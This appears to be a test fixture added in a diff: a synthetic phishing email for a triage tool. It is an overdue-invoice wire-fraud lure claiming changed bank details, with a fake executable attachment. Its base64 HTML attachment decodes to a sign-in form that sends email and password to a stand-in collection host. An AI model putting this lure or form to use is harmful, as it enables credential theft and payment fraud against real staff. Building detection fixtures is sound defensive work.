@@ -1,0 +1,68 @@
+Delivered-To: ap-team@contoso-corp.example
+Received: from CH3PR12MB8890.namprd12.prod.outlook.example (2001:db8:a0::1:12) by
+ SA1PR12MB7001.namprd12.prod.outlook.example with HTTPS; Tue, 13 Oct 2026
+ 13:05:31 +0000
+Received: from BN8NAM12FT045.eop-nam12.prod.protection.outlook.example
+ (2001:db8:a0::2:45) by CH3PR12MB8890.namprd12.prod.outlook.example
+ (2001:db8:a0::1:12) with Microsoft SMTP Server; Tue, 13 Oct 2026 13:05:30 +0000
+Authentication-Results: spf=pass (sender IP is 203.0.113.9)
+ smtp.mailfrom=vendor-billing.test; dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=vendor-billing.test;compauth=fail
+ reason=001
+Received-SPF: Pass (protection.outlook.example: domain of vendor-billing.test
+ designates 203.0.113.9 as permitted sender) receiver=protection.outlook.example;
+ client-ip=203.0.113.9; helo=smtp.vendor-billing.test;
+Received: from smtp.vendor-billing.test (203.0.113.9) by
+ BN8NAM12FT045.mail.protection.outlook.example (2001:db8:a0::2:45) with Microsoft
+ SMTP Server; Tue, 13 Oct 2026 13:05:29 +0000
+Received: from desktop-7k2p (unknown [192.168.4.31])
+ by smtp.vendor-billing.test (Postfix) with ESMTPSA id 1D9E0
+ for <ap-team@contoso-corp.example>; Tue, 13 Oct 2026 09:38:02 +0000 (UTC)
+Return-Path: <billing@vendor-billing.test>
+From: "Accounts Payable" <billing@vendor-billing.test>
+To: ap-team@contoso-corp.example
+Subject: OVERDUE: Invoice #88412 - payment required today
+Date: Tue, 13 Oct 2026 09:38:00 +0000
+Message-ID: <88412.1760348280@smtp.vendor-billing.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="mix_88412"
+
+--mix_88412
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+Hello,
+
+Invoice #88412 is now 30 days overdue. Please process payment by wire transfer
+today to avoid suspension of services. Note that our banking details have
+changed; the updated account information is in the attached invoice.
+
+Open the attached invoice to view and sign in to confirm.
+
+Thank you,
+Accounts Payable
+
+--mix_88412
+Content-Type: text/html; name="Invoice_88412.html"
+Content-Disposition: attachment; filename="Invoice_88412.html"
+Content-Transfer-Encoding: base64
+
+PCFkb2N0eXBlIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48dGl0bGU+
+RG9jdVNoYXJlIC0gVmlldyBJbnZvaWNlPC90aXRsZT48L2hlYWQ+Cjxib2R5Pgo8IS0tIFNZTlRI
+RVRJQyBURVNUIEZJTEUgZm9yIHBoaXNoaW5nLXRyaWFnZS10b29sLiBOb3QgYSByZWFsIHBoaXNo
+aW5nIGtpdC4gLS0+CjxoMz5TaWduIGluIHRvIHZpZXcgSW52b2ljZSAjODg0MTI8L2gzPgo8Zm9y
+bSBhY3Rpb249Imh0dHBzOi8vZG9jcy1zaGFyZS1pbnZvaWNlLnRlc3QvY29sbGVjdC5waHAiIG1l
+dGhvZD0icG9zdCI+CiAgPGlucHV0IG5hbWU9ImVtYWlsIiBwbGFjZWhvbGRlcj0iRW1haWwgYWRk
+cmVzcyI+CiAgPGlucHV0IG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCIgcGxhY2Vob2xk
+ZXI9IlBhc3N3b3JkIj4KICA8YnV0dG9uPlZpZXcgZG9jdW1lbnQ8L2J1dHRvbj4KPC9mb3JtPgo8
+L2JvZHk+PC9odG1sPgo=
+
+--mix_88412
+Content-Type: application/pdf; name="Invoice_88412.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_88412.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAApTWU5USEVUSUMgVEVTVCBGSUxFIGZvciBwaGlzaGluZy10cmlhZ2UtdG9vbC4gTm90IGV4
+ZWN1dGFibGUsIGNvbnRhaW5zIG5vIGNvZGUuCg==
+
+--mix_88412--
